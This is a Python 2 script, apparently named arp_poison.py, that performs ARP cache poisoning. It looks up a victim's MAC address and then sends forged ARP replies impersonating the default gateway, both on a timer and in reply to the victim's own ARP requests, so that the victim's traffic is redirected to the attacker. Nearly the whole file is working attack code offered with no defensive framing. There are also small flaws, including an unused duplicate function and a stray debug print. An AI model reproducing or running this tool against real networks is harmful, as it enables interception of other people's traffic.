import netifaces
import pcap
import sys
import gevent

from gevent.pool import Pool

from packets import *

victim_ip = None
victim_mac = None
gateway_ip = None


def send_periodically(infection_reply, interval_sec=1):
    print 'ppp'
    pcap_handle = pcap.pcap(timeout_ms=0)
    while True:
        pcap_handle.sendpacket(infection_reply.as_bytes())
        print '[<+] Periodical packet sent'
        gevent.sleep(interval_sec)


def reply_to_request(infection_reply):
    pcap_handle = pcap.pcap(timeout_ms=0)
    for capture in pcap.pcap(timeout_ms=0):
        if capture is None:
            continue
        time_stamp, packet = capture
        arp = ARP(packet)
        if arp.operation == ARP.OP_REQUEST \
                and arp.sender_protocol_address == victim_ip \
                and arp.sender_hardware_address == victim_mac \
                and arp.target_protocol_address == gateway_ip:
            print "[>+] Received victim's request for ip '{}'".format(gateway_ip)

            pcap_handle.sendpacket(infection_reply.as_bytes())
            print '[<+] Sent victim attack packet'


def relay_ip(from_ip, to_ip):
    pcap_handle = pcap.pcap(timeout_ms=0)
    for capture in pcap_handle:
        if capture is None:
            continue
        time_stamp, packet = capture
        arp = ARP(packet)
        if arp.operation == ARP.OP_REPLY and arp.sender_protocol_address == victim_ip:
            victim_mac = arp.sender_hardware_address
            print "[>+] victim replied his mac is '{}'".format(victim_mac.in_string)
            break


def main():
    global victim_ip, victim_mac, gateway_ip
    if len(sys.argv) != 2:
        print 'Usage: python arp_poison.py <victim ip>'
        exit(1)

    device_name = pcap.lookupdev()
    addresses = netifaces.ifaddresses(device_name)

    my_mac = MacAddress(addresses[netifaces.AF_LINK][0]['addr'])
    my_ip = IPv4Address(addresses[netifaces.AF_INET][0]['addr'])

    gateway_ip = IPv4Address(netifaces.gateways()['default'][netifaces.AF_INET][0])
    victim_ip = IPv4Address(sys.argv[1])
    print

    # ask victim his mac address
    pcap_handle = pcap.pcap(timeout_ms=0)
    pcap_handle.setfilter('arp')

    asking_arp = normal_request_arp(my_mac, my_ip, victim_ip)
    pcap_handle.sendpacket(asking_arp.as_bytes())
    print '[<+] Sent victim({}) an ARP request'.format(victim_ip.in_string)

    # wait for victim's response
    for capture in pcap_handle:
        if capture is None:
            continue
        time_stamp, packet = capture
        arp = ARP(packet)
        if arp.operation == ARP.OP_REPLY and arp.sender_protocol_address == victim_ip:
            victim_mac = arp.sender_hardware_address
            print "[>+] victim replied his mac is '{}'".format(victim_mac.in_string)
            break
    else:
        raise RuntimeError('Packet capture ended unexpectedly.')

    # attack packet
    infection_arp = normal_reply_arp(my_mac, gateway_ip, victim_mac, victim_ip)

    # additionally, grab victim's ARP request and send attack packet
    pcap_handle = pcap.pcap(timeout_ms=1000)
    pcap_handle.setfilter('arp')

    pool = Pool()
    replier = pool.spawn(reply_to_request, infection_arp)
    periodical = pool.spawn(send_periodically, infection_arp)
    periodical.start()
    pool.join()


if __name__ == '__main__':
    main()
